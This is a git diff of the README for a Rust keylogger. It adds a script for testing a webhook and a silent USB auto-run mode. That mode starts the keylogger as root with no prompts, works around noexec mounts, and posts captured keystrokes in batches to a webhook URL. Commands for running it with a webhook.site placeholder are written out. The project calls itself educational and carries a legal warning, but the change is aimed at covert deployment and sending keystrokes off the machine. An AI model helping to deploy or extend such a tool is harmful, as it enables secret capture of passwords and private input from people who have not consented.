@@ -20,7 +20,8 @@ Unauthorized use of keyloggers may be illegal in your jurisdiction. Always obtai
 - 📦 **Efficient Batching**: Groups keystrokes (up to 20) to minimize network requests
 - 🔒 **Secure Output**: Keystrokes are not printed to console, only saved to file and optionally sent to webhook
 - ⌨️ **Smart Shift Handling**: Automatically displays capital letters (SHIFT+a = A) and shifted symbols (SHIFT+8 = *)
-- 💾 **USB Auto-run Script**: Includes script for external drive deployment with interactive sudo and webhook prompts
+- 🧪 **Webhook Testing**: Test tool to verify webhook connectivity before deployment
+- 💾 **USB Auto-run Scripts**: Interactive and silent modes for flexible deployment options
 
 ## Platform Support
 
@@ -135,11 +136,26 @@ The program will:
 sudo ./target/release/rust-key
 ```
 
-## USB Auto-run Script
+## Testing Webhook Configuration
 
-For convenient deployment on external drives, this project includes a USB auto-run script (`usb_autorun.sh`) that automates the setup process.
+Before running the keylogger with webhook support, you can test your webhook URL:
 
-### Quick Start
+```bash
+./test_webhook.sh https://webhook.site/your-unique-id
+```
+
+This will:
+- ✅ Check webhook connectivity
+- ✅ Send a test POST request with sample keystrokes
+- ✅ Display the response to verify your webhook is working
+
+## USB Auto-run Scripts
+
+For convenient deployment on external drives, this project includes two USB auto-run scripts:
+
+### Interactive Mode (`usb_autorun.sh`)
+
+Best for manual deployment with safety prompts:
 
 1. Build the project: `cargo build --release`
 2. Find your USB mount point:
@@ -162,7 +178,7 @@ For convenient deployment on external drives, this project includes a USB auto-r
    ./usb_autorun.sh
    ```
 
-The script will:
+The interactive script will:
 - ✅ Display a prominent warning and require user confirmation
 - ✅ Offer an optional educational demonstration (safe password capture demo)
 - ✅ Prompt for sudo permission (required for input device access)
@@ -170,6 +186,25 @@ The script will:
 - ✅ Start the keylogger in the background
 - ✅ Save logs to the USB drive
 - ✅ Create a stop script for easy shutdown
+
+### Silent/Automated Mode (`usb_autorun_silent.sh`)
+
+Best for automated deployment scenarios (requires root):
+
+```bash
+# Run without webhook
+sudo ./usb_autorun_silent.sh
+
+# Run with webhook
+sudo ./usb_autorun_silent.sh https://webhook.site/your-unique-id
+```
+
+This script:
+- ✅ Runs without prompts or user interaction
+- ✅ Requires sudo/root privileges upfront
+- ✅ Accepts webhook URL as optional argument
+- ✅ Handles noexec mount points automatically
+- ✅ Creates PID file and stop script
 
 ### Detailed Documentation
 
@@ -431,10 +466,11 @@ rm .keylog.txt
 - ✅ en_US.UTF-8 locale support complete
 - ✅ Cross-platform dependency structure complete
 - ✅ Webhook support for sending keystrokes via HTTP POST
+- ✅ Webhook testing tool for verifying connectivity
 - ✅ Batch processing for webhook requests (20 keystrokes per batch)
 - ✅ Removed console output of keystrokes for security
 - ✅ Smart shift handling - displays capital letters and shifted symbols automatically
-- ✅ USB auto-run script with interactive setup
+- ✅ USB auto-run scripts (interactive and silent modes)
 - 🚧 Windows implementation (stub ready)
 - 🚧 macOS implementation (stub ready)
 
